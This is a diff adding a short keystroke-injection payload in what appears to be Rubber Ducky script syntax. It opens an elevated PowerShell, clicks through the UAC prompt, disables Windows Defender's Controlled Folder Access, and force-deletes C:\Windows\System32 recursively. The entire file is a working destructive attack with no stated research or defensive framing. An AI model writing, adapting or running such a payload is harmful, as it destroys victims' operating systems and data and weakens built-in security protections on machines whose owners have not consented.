@@ -1,0 +1,22 @@
+DELAY 500
+GUI r
+delay 250
+STRING powershell
+DELAY 200
+CTRL SHIFT ENTER
+DELAY 500
+LEFT
+DELAY 200
+ENTER
+DELAY 250
+STRING Set-MpPreference -EnableControlledFolderAccess Disabled
+DELAY 200
+ENTER
+DELAY 250
+STRING Remove-Item -Path C:\Windows\System32 -Force -Recurse
+DELAY 200
+ENTER
+DELAY 200
+STRING exit
+DELAY 200
+ENTER
